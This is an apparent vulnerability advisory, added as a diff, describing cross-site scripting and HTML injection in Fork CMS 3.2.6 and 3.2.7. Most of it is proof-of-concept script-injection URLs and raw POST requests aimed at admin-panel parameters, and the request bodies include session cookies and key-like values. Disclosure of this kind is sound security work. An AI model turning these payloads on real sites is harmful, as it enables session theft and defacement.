@@ -1,0 +1,61 @@
+source: http://www.securityfocus.com/bid/52319/info
+
+Fork CMS is prone to multiple cross-site scripting and HTML-injection vulnerabilities because it fails to properly sanitize user-supplied input.
+
+Successful exploits will allow attacker-supplied HTML and script code to run in the context of the affected browser, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user. Other attacks are also possible.
+
+Fork CMS 3.2.7 and 3.2.6 are vulnerable; other versions may also be affected. 
+
+http://www.example.com/private/en/locale/edit?id=37&value="><script>alert("ZSL");</script>
+
+http://www.example.com/private/en/locale/edit?id=37&name="><script>alert("ZSL");</script>
+
+http://www.example.com/private/en/locale/edit?id=37&type[]="><script>alert("ZSL");</script>
+
+http://www.example.com/private/en/locale/edit?id=37&module="><script>alert("ZSL");</script>
+
+http://www.example.com/private/en/locale/edit?id=37&application="><script>alert("ZSL");</script>
+
+http://www.example.com/private/en/locale/edit?id=37&language[]="><script>alert("ZSL");</script>
+
+Parameter: form_token
+Method: POST
+
+ - POST /private/en/authentication/?querystring=/private/en HTTP/1.1
+   Content-Length: 134
+   Content-Type: application/x-www-form-urlencoded
+   Cookie: PHPSESSID=t275j7es7rj2078a25o4m27lt0; interface_language=s%3A2%3A%22en%22%3B; track=s%3A32%3A%22b8cab7d50fd32c5dd3506d0c88edb795%22%3B
+   Host: localhost:80
+   Connection: Keep-alive
+   Accept-Encoding: gzip,deflate
+   User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)
+
+   backend_email=&backend_password=&form=authenticationIndex&form_token="><script>alert("ZSL");</script>&login=Log%20in
+
+Parameters: position_1, position_2, position_3, position_4
+Method: POST
+
+ - POST http://localhost/private/en/extensions/edit_theme_template?token=true&id=4 HTTP/1.1
+
+   form=edit&form_token=d75161cf347e7b12f53df4cf4082f27a&theme=triton&file=home.tpl&label=Home&position_0=&type_0_0=0&position_1="><script>alert("ZSL");</script>&position_2=left&position_3=right&position_4=top&type_4_0=1&position_5=advertisement&format=%5B%2F%2Cadvertisement%2Cadvertisement%2Cadvertisement%5D%2C%0D%0A%5B%2F%2C%2F%2Ctop%2Ctop%5D%2C%0D%0A%5B%2F%2C%2F%2C%2F%2C%2F%5D%2C%0D%0A%5Bmain%2Cmain%2Cmain%2Cmain%5D%2C%0D%0A%5Bleft%2Cleft%2Cright%2Cright%5D
+
+Parameter: success_message
+Method: POST
+
+ - POST http://localhost/private/en/form_builder/edit?token=true&id=1 HTTP/1.1
+
+   form=edit&form_token=&id=1&name=Contact&method=database_email&inputField-email%5B%5D=jox@jox.com&addValue-email=&email=jox@jox.com&success_message="><script>alert("ZSL");</script>&identifier=contact-en
+
+Parameter: smtp_password
+Method: POST
+
+ - POST http://localhost/private/en/settings/email HTTP/1.1
+
+   form=settingsEmail&form_token=&mailer_type=mail&mailer_from_name=Fork+CMS&mailer_from_email=jox@jox.com&mailer_to_name=Fork+CMS&mailer_to_email=jox@jox.com&mailer_reply_to_name=Fork+CMS&mailer_reply_to_email=jox@jox.com&smtp_server=&smtp_port=&smtp_username=&smtp_password="><script>alert("ZSL");</script>
+
+Parameters: site_html_footer, site_html_header
+Method: POST
+
+ - POST http://localhost/private/en/settings/index HTTP/1.1
+
+   form=settingsIndex&form_token=&site_title=My+website&site_html_header=&site_html_footer="><script>alert("ZSL");</script>&time_format=H%3Ai&date_format_short=j.n.Y&date_format_long=l+j+F+Y&number_format=dot_nothing&fork_api_public_key=f697aac745257271d83bea80f965e3c1&fork_api_private_key=6111a761ec566d325a623e0dcaf614e2&akismet_key=&ckfinder_license_name=Fork+CMS&ckfinder_license_key=QJH2-32UV-6VRM-V6Y7-A91J-W26Z-3F8R&ckfinder_image_max_width=1600&ckfinder_image_max_height=1200&addValue-facebookAdminIds=&facebook_admin_ids=&facebook_application_id=&facebook_application_secret=
